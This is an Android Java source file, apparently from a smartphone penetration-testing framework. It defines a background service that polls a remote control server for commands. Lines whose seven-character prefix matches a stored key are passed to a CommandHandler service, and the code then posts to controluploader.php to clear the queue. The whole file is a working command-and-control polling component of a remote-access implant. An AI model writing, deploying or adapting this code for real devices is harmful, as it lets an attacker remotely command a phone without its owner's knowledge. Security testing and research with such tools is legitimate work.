package com.bulbsecurity.framework;


import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;


public class InternetPoller extends Service {


	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		 Log.i("AAA", "Started Internetpoll");
		 new Thread() {
				public void run() {
		 String http = "http://";
		//String controlIP = ((AndroidAgent) this.getApplication()).getcontrolIP();
		//String path = ((AndroidAgent) this.getApplication()).getpath(); 
		//String urii = ((AndroidAgent) this.getApplication()).getURL();
		//String controlIP = "192.168.1.103";
		//String path = "/androidagent1";
		//String urii = "/control";
		 String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
		 String path = getApplicationContext().getResources().getString(R.string.controlpath);
		 String urii = getApplicationContext().getResources().getString(R.string.urii);
		String uri = http.concat(controlIP);
		String uri2 = uri.concat(path);
		String pullfrom = uri2.concat(urii);
		Log.i("AAA", pullfrom);
		URL url = null;
		
			try {
				url = new URL(pullfrom);
				BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
				if (in != null)
				{
					Log.i("AAA", "Stream opened");
				String inputLine;
				while ((inputLine = in.readLine()) != null){
					Log.i("AAA", inputLine);
					//String key = ((AndroidAgent) this.getApplication()).getkey();
					String key = getApplicationContext().getResources().getString(R.string.key);
					 Log.i("AAA", key);
					if (inputLine.length() >= 7)
					{
						String checkkey = inputLine.substring(0,7);
						if (checkkey.equals(key))
						{
							Intent intent2 = new Intent(getApplicationContext(), CommandHandler.class);
							intent2.putExtra("message", inputLine);
							Context context = getApplicationContext();
							context.startService(intent2);
					
						}
					}
				}
				
				ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
				nameValuePairs.add(new BasicNameValuePair("text", ""));
			
					HttpClient httpclient = new DefaultHttpClient();
					String url2 = "/controluploader.php";
					String uri3 = http.concat(controlIP);
					String postto1 = uri3.concat(path);
					String postto = postto1.concat(url2);
					HttpPost httppost = new HttpPost(postto);
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
					httpclient.execute(httppost);
					//HttpEntity entity = response.getEntity();
					//InputStream input = entity.getContent();
					
				in.close();
				stopSelf();
			}
			
	
				
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 	};
			}.start();
		
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onDestroy() {
	}

}


